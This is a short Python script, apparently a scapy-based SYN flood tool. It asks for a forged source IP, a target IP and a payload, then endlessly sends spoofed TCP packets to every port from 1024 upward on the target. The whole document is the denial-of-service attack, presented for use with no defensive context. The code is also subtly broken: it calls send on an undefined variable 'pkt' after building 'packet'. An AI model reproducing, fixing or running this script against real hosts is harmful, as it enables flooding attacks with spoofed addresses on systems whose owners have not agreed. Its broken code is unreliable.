#!/usr/bin/python3

from scapy.all import *

def synFlood(src, tgt, message):
    for dport in range(1024, 65535):
        IPLayer = IP(src =src, dst = tgt)
        TCPLayer = TCP(sport =4444, dport=dport)
        RAWLayer = Raw(load = message)
        packet = IPLayer/TCPLayer/RAWLayer
        send(pkt)
        
source = input("[*] Enter source IP address to fake: ")
target = input("[*] Enter Target IP address: ")
message = input("[*] Enter the message for TCP payload: ")
        
while True:
    synFlood(source, target, message)

    
        